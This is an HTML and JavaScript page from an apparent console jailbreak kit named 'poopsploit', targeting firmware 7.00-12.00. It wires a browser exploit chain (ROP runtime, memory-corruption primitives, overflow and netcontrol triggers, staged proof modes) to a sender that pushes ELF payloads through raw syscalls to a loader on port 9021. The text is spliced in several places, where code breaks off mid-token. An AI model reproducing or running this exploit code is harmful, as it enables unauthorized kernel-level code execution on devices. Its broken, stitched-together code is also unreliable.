id=\"verdict\">\u003c/div>\n    \u003cdiv id=\"danger\">\u003c/div>\n    \u003cdiv id=\"stage\">idle\u003c/div>\n    \u003cdiv id=\"vitals\">\u003c/div>\n    \u003cdiv id=\"cfg\">\u003c/div>\n    \u003cpre id=\"early\">\u003c/pre>\n    \u003cpre id=\"scr\">\u003c/pre>\n    \u003cdiv id=\"nav\">\u003c/div>\n    \u003cdiv id=\"arm\" hidden>Open this page with \u003cb>?go=1\u003c/b> to arm it. Nothing runs\n    otherwise.\u003c/div>\n    \u003cdiv id=\"wrap\">\n      \u003ctable>\n        \u003cthead>\u003ctr>\u003cth>#\u003c/th>\u003cth>test\u003c/th>\u003cth>st\u003c/th>\u003cth>result\u003c/th>\u003c/tr>\u003c/thead>\n        \u003ctbody id=\"rows\">\u003c/tbody>\n      \u003c/table>\n    \u003c/div>\n    \u003cdiv id=\"tally\">\u003c/div>\n    \u003cdiv id=\"summary\">\u003c/div>\n  \u003c/div>\n  \u003cdiv id=\"payloads-view\" class=\"app-view\">\n    \u003cdiv class=\"payloadHeader\">\n      \u003ch2 id=\"payloadViewTitle\">poopsploit Payloads (7.00-12.00)\u003c/h2>\n      \u003cdiv class=\"payloadEyebrow\" id=\"payloadNetworkStatus\">Listening on console port 9021\u003c/div>\n      \u003cp id=\"payloadProgress\">Select a payload to send it to the ELF loader.\u003c/p>\n      \u003ca class=\"homeLink\" href=\"../index.html\">Home\u003c/a>\n    \u003c/div>\n    \u003cdiv class=\"payloadGrid\">\u003c/div>\n  \u003c/div>\n\u003cscript>\n/* SITE IDENTITY - the ONE place this site names itself.\n   The ELF page used to carry another project's name and firmware range because the view\n   was ported verbatim; filling the header from these two constants means a copied file\n   can never silently advertise the wrong thing again. build_p2jb_idle.py rewrites\n   SITE_NAME when it regenerates the idle pair. Nothing here depends on the host, so it\n   is correct served from a LAN box or from a static site. */\nvar SITE_NAME = \"poopsploit\";\nvar SITE_FW   = \"7.00-12.00\";\n(function () {\n    try {\n        var h = document.getElementById(\"payloadViewTitle\");\n        if (h) h.textContent = SITE_NAME + \" Payloads (\" + SITE_FW + \")\";\n    } catch (e) { }\n    try { document.title = SITE_NAME; } catch (e) { }\n})();\n\u003c/script>\n  \u003cdiv id=\"prompt-view\" class=\"app-view\">\n    \u003cdiv id=\"loaderPrompt\">\n      \u003cdiv class=\"promptBadge\">9021\u003c/div>\n      \u003ch2>ELF loader is not running\u003c/h2>\n      \u003cp>Port 9021 is not open. Would you like to run the jailbreak now and start the ELF loader?\u003c/p>\n      \u003cdiv class=\"promptActions\">\n        \u003ca id=\"promptJailbreak\" class=\"promptButton\" href=\"#\">Jailbreak\u003c/a>\n        \u003ca class=\"promptButton secondary\" href=\"../index.html\">Cancel\u003c/a>\n      \u003c/div>\n    \u003c/div>\n  \u003c/div>\n\u003c/div>\n\u003cdiv id=\"payloadToastContainer\">\u003c/div>\n\u003cdiv id=\"poopsploitFooter\">poopsploit final\u003c/div>\n\n\u003cdiv id=\"console\" hidden>\u003c/div>\n\n\u003cscript src=\"rop.js?v=lowfw17\">\u003c/script>\n\u003cscript src=\"main.js?v=lowfw17\">\u003c/script>\n\u003cscript>window.offsetsReady = new Promise(function (res, rej) {\n    var s = document.querySelector('script[src^=\"../offsets/\"]');\n    if (!s) return rej(new Error(\"offsets script was never injected by main.js\"));\n    if (typeof OFFSET_wk_vtable_first_element !== \"undefined\") return res(s.src);\n    s.addEventListener(\"load\", function () { res(s.src); });\n    s.addEventListener(\"error\", function () {\n        rej(new Error(\"offsets 404: \" + s.src));\n    });\n});\n\u003c/script>\n\u003cscript src=\"syscalls.js\">\u003c/script>\n\n\u003cscript type=\"module\">import { establishPrimitive, fakeCellReleased, CORE_INSTANCE } from \"./core.js?v=lowfw17\";\nimport { installWindowP, pairStatus, MEM_SEES_CORE } from \"./mem.js?v=lowfw17\";\nimport { int64 } from \"./int64.js\";\n\nlet BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList;\n\n// Fail LOUDLY on a module-version split. core.js keeps the entire primitive in\n// module-level `let` ferred-until-after-primitive-fw=\"\n        + window.fw_str + \"-pthreadCreateOff=0x\"\n        + (PK.LK_PTHREAD_CREATE_NAME_NP >>> 0).toString(16)\n        + \"-pthreadJoinOff=0x\" + (PK.LK_PTHREAD_JOIN >>> 0).toString(16));\n}\n\nconst Q = new URLSearchParams(location.search);\nconst LOG_DEBUG = Q.get(\"log\") === \"debug\";\nconst ARMED = Q.get(\"go\") === \"1\";\nconst CLEARLATCH = Q.get(\"clear\") === \"1\";\nconst CHECKPOINT = Q.get(\"checkpoint\") === \"1\";\nconst STAGE0_PROOF = Q.get(\"proof\") === \"stage0\";\nconst STAGE1_PROOF = Q.get(\"proof\") === \"stage1\";\nconst STAGE2_PROOF = Q.get(\"proof\") === \"stage2\";\nconst STAGE3_PROOF = Q.get(\"proof\") === \"stage3\";\nconst STAGE4_PROOF = Q.get(\"proof\") === \"stage4\";\nconst STAGE5_DRY_PROOF = Q.getAll(\"proof\").length === 1\n    && Q.get(\"proof\") === \"stage5dry\";\nconst STAGE5_LIVE_PROOF = Q.getAll(\"proof\").length === 1\n    && Q.get(\"proof\") === \"stage5live\";\nconst PROOF = STAGE5_LIVE_PROOF ? \"stage5live\"\n    : STAGE5_DRY_PROOF ? \"stage5dry\"\n        : STAGE4_PROOF ? \"stage4\" : STAGE3_PROOF ? \"stage3\"\n            : STAGE2_PROOF ? \"stage2\" : STAGE1_PROOF ? \"stage1\"\n                : STAGE0_PROOF ? \"stage0\" : \"\";\nconst PROOF_TITLE = PROOF === \"stage5live\" ? \"Stage 5 live\"\n    : PROOF === \"stage5dry\" ? \"Stage 5 dry\"\n        : (PROOF ? \"Stage \" + PROOF.slice(5) : \"\");\n\nconst AUTOCLEAR = Q.get(\"auto\") === \"1\";\nconst FROM = Q.get(\"from\") || \"\";\nconst ONLY = (Q.get(\"only\") || \"\").split(\",\").map(s => s.trim()).filter(Boolean);\nconst FILTERED_RUN = ONLY.length > 0 || FROM !== \"\";\nconst MAX_ATTEMPTS = parseInt(Q.get(\"max\") || \"0\", 10) || 0;\nconst CORE_OVERRIDE = Q.has(\"core\") ? parseInt(Q.get(\"core\"), 10) : -1;\nconst REUSE_ELFLDR = Q.get(\"reuse\") === \"1\";\n\nconst PROGRESS_KEY = \"poopsploit-poops:next\";\nconst RUNLOG_KEY = \"poopsploit-poops:last\";\nconst ROUTE_VERSION = \"lowfw17\";\nconst REV = \"poopsploit-poops-final\";\nconst CHECKPOINT_ONLY = \"ps0_preflight,ps1_prepare,ps3_stage0\";\nconst STAGE5_ONLY = \"ps0_preflight,ps1_prepare,ps3_stage0,ps4_validate,\"\n    + \"ps5_stage1,ps6_stage2,ps8_stage3,ps9_stage4,ps10_stage5\";\nconst STAGE5_FIRMWARES = Object.freeze([\n    \"7.00\", \"7.01\", \"7.20\", \"7.40\", \"7.60\", \"7.61\",\n    \"8.00\", \"8.20\", \"8.40\", \"8.60\",\n    \"9.00\", \"9.05\", \"9.20\", \"9.40\", \"9.60\", \"10.00\", \"10.01\", \"10.20\",\n    \"10.40\", \"10.60\", \"11.00\", \"11.20\", \"11.40\", \"11.60\", \"12.00\"\n]);\n\nfunction storeGet(k) {\n    try { return sessionStorage.getItem(k) || \"\"; } catch { return \"\"; }\n}\nfunction storeSet(k, v) { try { sessionStorage.setItem(k, v); } catch { } }\nfunction storeDel(k) { try { sessionStorage.removeItem(k); } catch { } }\nfunction consumeStored(k) {\n    try {\n        sessionStorage.removeItem(k);\n        return sessionStorage.getItem(k) === null;\n    } catch (e) {\n        return false;\n    }\n}\nfunction storeJson(k) {\n    const raw = storeGet(k);\n    if (!raw) return null;\n    try { return JSON.parse(raw); } catch { return null; }\n}\nlet STALLED_AT = storeGet(PROGRESS_KEY);\nlet LAST_RUN = storeJson(RUNLOG_KEY);\n\nconst TRIGGER = (() => {\n    const t = (Q.get(\"trigger\") || \"none\").toLowerCase();\n    return (t === \"netcontrol\" || t === \"overflow\") ? t : \"none\";\n})();\nconst BURN = (() => {\n    const b = (Q.get(\"burn\") || \"probe\").toLowerCase();\n    return (b === \"none\" || b === \"full\") ? b : \"probe\";\n})();\nconst DEFAULT_ATTEMPTS = TRIGGER === \"overflow\" ? 96\n    : TRIGGER === \"netcontrol\" ? 8 : 1;\n\nconst cfg = {\n\n    payload: Q.get(\"payload\") || \"\",\n    trigger: TRIGGER,\n    burn: BURN,\n    netprobe: Q.get(\"netprobe\") === \"1\",\n    sockets: Math.max(4, Math.min(128,\n        parseInt(Q.get(\"sockets\") || \"\", 10) || 80)),\n    attempts: Math.max(1, Math.min(512,\n        parseInt(Q.get(\"attempts\") || \"\", 10) || DEFAULT_ATTEMPTS)),\n    kqB ddr[6] = 0;\n        addr[7] = 1;\n    }\n    if (payloadSocketOptionStore === null) {\n        payloadSocketOptionStore = mem(4);\n        payloadSocketOptionStore.u8.fill(0);\n        payloadSocketOptionStore.u8[0] = 1;\n    }\n    if (payloadSendTimeoutStore === null) {\n        payloadSendTimeoutStore = mem(0x10);\n        payloadSendTimeoutStore.u8.fill(0);\n        payloadSendTimeoutStore.u8[0] = 15;\n    }\n}\n\nasync function sendPayloadToElfldr(name) {\n    if (!elfldrSpawned)\n        throw new Error(\"ELF loader is not ready\");\n    if (!P || !chain)\n        throw new Error(\"the post-jailbreak ROP runtime is unavailable\");\n    if (chainDead)\n        throw new Error(\"the ROP chain is unusable after \" + chainDead);\n    if (payloadSenderBlocked)\n        throw new Error(payloadSenderBlocked);\n    if (!payloadIsListed(name))\n        throw new Error(\"payload is not listed in this menu\");\n\n    const response = await fetch(\"../payloads/\" + encodeURIComponent(name),\n        { cache: \"no-store\" });\n    if (!response.ok)\n        throw new Error(\"payload fetch failed: HTTP \" + response.status);\n    const bytes = new Uint8Array(await response.arrayBuffer());\n    if (!bytes.length)\n        throw new Error(\"payload is empty\");\n    if (bytes.length \u003c 4 || bytes[0] !== 0x7f || bytes[1] !== 0x45\n        || bytes[2] !== 0x4c || bytes[3] !== 0x46)\n        throw new Error(\"payload does not start with the ELF signature\");\n\n    preparePayloadSender();\n    let fd = -1;\n    let sent = 0;\n    let failure = null;\n    let closeWarning = null;\n    try {\n        let result = await sys(SYS_SOCKET, 2, 1, 0);\n        if (result.failed || result.s32 \u003c 0)\n            throw payloadSyscallError(\"socket\", result);\n        fd = result.s32;\n        track(fd);\n\n        result = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x0800,\n            payloadSocketOptionStore.ptr, 4);\n        if (result.failed || result.s32 !== 0)\n            throw
